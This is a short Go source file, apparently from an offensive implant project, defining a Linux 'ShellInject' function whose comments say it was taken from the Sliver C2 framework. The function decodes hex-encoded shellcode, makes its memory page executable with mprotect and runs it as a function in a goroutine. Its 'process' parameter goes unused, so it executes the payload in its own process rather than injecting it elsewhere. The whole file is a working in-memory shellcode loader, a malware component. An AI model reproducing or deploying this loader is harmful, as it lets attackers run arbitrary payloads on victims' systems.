// +build linux

package shellinject

import (
	"encoding/hex"
	"runtime"
	"syscall"
	"unsafe"
)

//GOT FROM SLIVER SO WE NEED TO CHANGE AND MAKE OUR OWN
func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
}

//ShellInject for Linux
func ShellInject(data string, process string) {

	sc, _ := hex.DecodeString(data)

	//logging.Logger.Println("shellcode is :", sc)
	//logging.Logger.Println("Process is :", process)

	//GOT FROM SLIVER SO WE NEED TO CHANGE AND MAKE OUR OWN
	dataAddr := uintptr(unsafe.Pointer(&sc[0]))
	page := getPage(dataAddr)
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	dataPtr := unsafe.Pointer(&sc)
	funcPtr := *(*func())(unsafe.Pointer(&dataPtr))
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	go func(fPtr func()) {
		fPtr()
	}(funcPtr)

}
